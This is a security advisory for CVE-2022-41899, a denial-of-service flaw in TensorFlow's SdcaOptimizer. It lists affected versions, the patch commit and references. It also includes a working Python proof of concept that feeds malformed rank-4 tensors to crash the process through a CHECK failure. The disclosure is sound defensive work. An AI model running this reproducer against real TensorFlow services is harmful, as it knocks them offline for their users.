@@ -1,0 +1,69 @@
+# [M] `CHECK` fail via inputs in `SdcaOptimizer`
+
+## Summary
+Severity: Medium
+Advisory: GHSA-27rc-728f-x5w2
+CVE: CVE-2022-41899
+CWE: CWE-20, CWE-617
+Ecosystem: PyPI
+CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
+Published: 2022-11-21
+Source: https://github.com/advisories/GHSA-27rc-728f-x5w2
+Type: github-advisory
+
+## Affected
+- PyPI: `tensorflow` — affected >=0 <2.8.4
+- PyPI: `tensorflow` — affected >=2.9.0 <2.9.3
+- PyPI: `tensorflow` — affected >=2.10.0 <2.10.1
+- PyPI: `tensorflow-cpu` — affected >=0 <2.8.4
+- PyPI: `tensorflow-gpu` — affected >=0 <2.8.4
+- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.3
+- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.3
+- PyPI: `tensorflow-cpu` — affected >=2.10.0 <2.10.1
+- PyPI: `tensorflow-gpu` — affected >=2.10.0 <2.10.1
+
+## Details
+### Impact
+Inputs `dense_features` or `example_state_data` not of rank 2 will trigger a `CHECK` fail in [`SdcaOptimizer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc).
+
+```python
+import tensorflow as tf
+
+tf.raw_ops.SdcaOptimizer(
+    sparse_example_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
+    sparse_feature_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
+    sparse_feature_values=8 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
+    dense_features=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
+    example_weights=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
+    example_labels=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
+    sparse_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],
+    sparse_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
+    dense_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],
+    example_state_data=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),
+    loss_type="squared_loss",
+    l1=0.0,
+    l2=0.0,
+    num_loss_partitions=1,
+    num_inner_iterations=1,
+    adaptative=False,)
+```
+
+### Patches
+We have patched the issue in GitHub commit [80ff197d03db2a70c6a111f97dcdacad1b0babfa](https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa).
+
+The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.
+
+
+### For more information
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+
+### Attribution
+This vulnerability has been reported by Zizhuang Deng of IIE, UCAS
+
+## References
+- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-27rc-728f-x5w2
+- https://nvd.nist.gov/vuln/detail/CVE-2022-41899
+- https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa
+- https://github.com/tensorflow/tensorflow
+- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc
